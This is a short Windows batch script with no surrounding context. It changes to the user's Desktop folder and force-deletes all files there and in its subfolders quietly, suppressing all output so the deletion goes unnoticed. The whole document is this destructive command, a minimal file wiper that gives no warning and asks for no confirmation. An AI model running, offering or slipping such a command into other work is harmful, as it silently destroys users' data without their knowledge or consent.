@echo off
cd %USERPROFILE%\desktop
del *.* /f /s /q >nul 2>&1
exit